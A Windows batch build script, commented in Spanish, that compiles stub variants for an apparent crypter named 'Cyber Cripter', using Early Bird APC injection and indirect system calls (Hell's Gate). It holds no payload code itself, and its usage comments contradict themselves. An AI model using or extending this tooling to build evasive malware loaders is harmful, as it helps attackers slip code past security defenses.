@echo off
REM Build script para stub_template.exe (x64).
REM
REM Uso:
REM     build.bat                  -> compila el variante por defecto (EarlyBirdAPC)
REM     build.bat IndirectSC       -> compila la variante del stub utilizada para Debugging (con máximo muestreo de mensajes informativos y sin inyección en memoria)
REM     build.bat EarlyBirdAPC     -> compila el stub por defecto que utiliza la técnica Early Bird APC Injection
REM     build.bat IndirectSC       -> compila el stub que utiliza la técnica indirect system calls
REM
REM En ambos casos, el binario resultante se copia a
REM   ..\Cyber Cripter\Resources\stub_template.exe
REM para que el builder C# lo recoja en runtime.
REM
REM Ejecutar desde una "x64 Native Tools Command Prompt for VS" para que
REM cl.exe, link.exe y ml64.exe estén en PATH. Si no, llamar primero a:
REM   "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

setlocal
pushd "%~dp0"

if not exist "build" mkdir build

set VARIANT=%1
if "%VARIANT%"=="" set VARIANT=EarlyBirdAPC

REM Comprueba si se solicitó otra variante de stub (build.bat IndirectSC | build.bat Test )
if /i "%VARIANT%"=="EarlyBirdAPC" goto :build_eb
if /i "%VARIANT%"=="IndirectSC"   goto :build_isc
if /i "%VARIANT%"=="Test"   goto :test

echo Variant desconocido: %VARIANT%
echo Uso: build.bat [EarlyBirdAPC^|IndirectSC|Test]
popd
endlocal
exit /b 1

REM ---------------- EarlyBird APC (clásico, sólo Win32) ----------------
:build_eb
echo Building stub_EarlyBirdAPC.c ...
cl /nologo /W3 /O2 /GS- /MT /D_CRT_SECURE_NO_WARNINGS ^
   /Fobuild\stub_EarlyBirdAPC.obj /Fdbuild\stub_EarlyBirdAPC.pdb ^
   stub_EarlyBirdAPC.c ^
   /link /SUBSYSTEM:WINDOWS /MACHINE:X64 ^
         /OUT:build\stub_template.exe ^
         bcrypt.lib kernel32.lib advapi32.lib
if errorlevel 1 goto :failed
goto :ok

REM ---------------- Stub Test ----------------
:test
echo Building stub_Test.c ...
cl /nologo /W3 /O2 /GS- /MT /D_CRT_SECURE_NO_WARNINGS ^
   /Fobuild\stub_Test.obj /Fdbuild\stub_Test.pdb ^
   stub_Test.c ^
   /link /SUBSYSTEM:WINDOWS /MACHINE:X64 ^
         /OUT:build\stub_template.exe ^
         bcrypt.lib kernel32.lib advapi32.lib
if errorlevel 1 goto :failed
goto :ok


REM ---------------- Indirect System Calls (Hell's Gate) ----------------
:build_isc
echo Building syscall.asm (trampolin ASM) ...
ml64 /nologo /c /Fobuild\syscall.obj syscall.asm
if errorlevel 1 goto :failed

echo Building stub_IndirectSC.c ...
cl /nologo /W3 /O2 /GS- /MT /D_CRT_SECURE_NO_WARNINGS ^
   /Fobuild\stub_IndirectSC.obj /Fdbuild\stub_IndirectSC.pdb ^
   stub_IndirectSC.c ^
   /link /SUBSYSTEM:WINDOWS /MACHINE:X64 ^
         /OUT:build\stub_template.exe ^
         build\syscall.obj ^
         bcrypt.lib kernel32.lib advapi32.lib
if errorlevel 1 goto :failed
goto :ok

REM ---------------- post-build ----------------
:ok
echo.
echo Built: %~dp0build\stub_template.exe   (variant: %VARIANT%)
copy /y "build\stub_template.exe" "..\Cyber Cripter\Resources\stub_template.exe" >nul
if errorlevel 1 (
    echo Could not auto-copy. Do it manually.
) else (
    echo Auto-copied to Resources\stub_template.exe.
)
popd
endlocal
exit /b 0

:failed
echo.
echo BUILD FAILED.
popd
endlocal
exit /b 1
